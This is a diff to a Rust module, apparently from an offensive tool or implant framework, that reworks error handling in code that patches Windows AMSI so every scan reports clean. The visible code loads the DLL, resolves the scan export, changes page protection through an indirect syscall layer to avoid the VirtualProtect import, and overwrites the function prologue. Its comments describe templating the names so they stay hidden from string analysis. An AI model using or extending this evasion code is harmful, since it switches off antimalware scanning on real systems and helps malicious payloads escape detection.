@@ -75,19 +75,6 @@ const AMSI_OPEN_SESSION_PATCH: [u8; 11] = [
     0xC2, 0x08, 0x00, // ret 8
 ];
 
-/// Errors produced while patching a scan function.
-#[derive(Debug, thiserror::Error)]
-pub enum PatchAmsiError {
-    #[error("failed to load the library to patch")]
-    LoadFailed,
-    #[error("failed to resolve the function to patch")]
-    ResolveFailed,
-    #[error("failed to make the target function writable")]
-    MakeWritableFailed,
-    #[error("failed to restore the target function protection")]
-    RestoreProtectionFailed,
-}
-
 /// Patches the AMSI scan exports in the current process so every scan reports
 /// clean.
 ///
@@ -105,7 +92,7 @@ pub enum PatchAmsiError {
 /// do not appear in `strings`. The page protection changes go through the
 /// syscall layer's `nt_protect_vm`, so `mode: indirect` removes the
 /// `VirtualProtect` import.
-pub fn patch_amsi() -> Result<bool, PatchAmsiError> {
+pub fn patch_amsi() -> Result<bool, String> {
     patch_export(&$AMSI_DLL_DEF$, &$AMSI_FUNC_DEF$, &AMSI_SCAN_BUFFER_PATCH)?;
     if PATCH_SCAN_STRING {
         patch_optional(
@@ -136,19 +123,19 @@ fn patch_optional(dll: &str, func: &str, patch: &[u8]) {
 }
 
 /// Resolves `func` in `dll` and overwrites its prologue with `patch`.
-fn patch_export(dll_name: &str, export_name: &str, patch: &[u8]) -> Result<(), PatchAmsiError> {
+fn patch_export(dll_name: &str, export_name: &str, patch: &[u8]) -> Result<(), String> {
     crate::tech_dbg!("patch_amsi", "patching {dll_name}!{export_name}");
 
-    let dll = std::ffi::CString::new(dll_name).map_err(|_| PatchAmsiError::LoadFailed)?;
-    let func = std::ffi::CString::new(export_name).map_err(|_| PatchAmsiError::LoadFailed)?;
+    let dll = std::ffi::CString::new(dll_name).map_err(|_| $MSG_LOAD_FAILED$)?;
+    let func = std::ffi::CString::new(export_name).map_err(|_| $MSG_LOAD_FAILED$)?;
 
     // 1. Load the library (a no-op if it is already loaded).
     let module = unsafe { LoadLibraryA(PCSTR(dll.as_ptr() as *const u8)) }
-        .map_err(|_| PatchAmsiError::LoadFailed)?;
+        .map_err(|_| $MSG_LOAD_FAILED$)?;
 
     // 2. Resolve the export.
     let address = unsafe { GetProcAddress(module, PCSTR(func.as_ptr() as *const u8)) };
-    let address = address.ok_or(PatchAmsiError::ResolveFailed)?;
+    let address = address.ok_or($MSG_RESOLVE_FAILED$)?;
     let target = address as usize as *mut u8;
     crate::tech_dbg!("patch_amsi", "resolved target at {target:p}");
 
@@ -164,7 +151,7 @@ fn patch_export(dll_name: &str, export_name: &str, patch: &[u8]) -> Result<(), P
         &mut old_protect,
     );
     if status < 0 {
-        return Err(PatchAmsiError::MakeWritableFailed);
+        return Err($MSG_MAKE_WRITABLE_FAILED$);
     }
 
     // 4. Write the patch.
@@ -181,7 +168,7 @@ fn patch_export(dll_name: &str, export_name: &str, patch: &[u8]) -> Result<(), P
         &mut old_protect,
     );
     if status < 0 {
-        return Err(PatchAmsiError::RestoreProtectionFailed);
+        return Err($MSG_RESTORE_PROTECTION_FAILED$);
     }
     crate::tech_dbg!(
         "patch_amsi",
